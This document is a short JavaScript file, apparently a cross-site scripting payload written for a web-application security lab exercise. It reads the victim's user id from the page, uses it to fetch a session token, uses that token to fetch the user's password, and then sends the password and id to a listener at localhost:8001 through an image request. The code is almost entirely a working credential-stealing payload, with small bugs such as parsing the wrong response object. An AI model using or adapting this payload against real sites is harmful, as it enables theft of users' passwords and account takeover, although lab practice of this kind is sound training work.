var link  = document.getElementById("settings");
var req = new XMLHttpRequest();
var uid = '';
var token = '';
var req2 = new XMLHttpRequest();


req2.onreadystatechange = function(){
  if(req2.readyState == 4 && req2.status == 200){
    var pass_obj = JSON.parse(req.responseText);
    var password = pass_obj.params.password;
    new Image().src = "http://localhost:8001/?password"+password+"&uid="+uid;
    }
};

req.onreadystatechange = function(){
  if(req.readyState == 4 && req.status == 200){
    var response_obj = JSON.parse(req.responseText);
    token = response_obj.params.token;
    req2.open("GET", "/lab/webapp/jfp/20/getpassword?token="+token ,true);
    req2.send();
  }
};

uid = link.innerHTML.split(':')[1];
req.open("GET", "/lab/webapp/jfp/20/gettoken?uid="+uid ,true);
req.send();
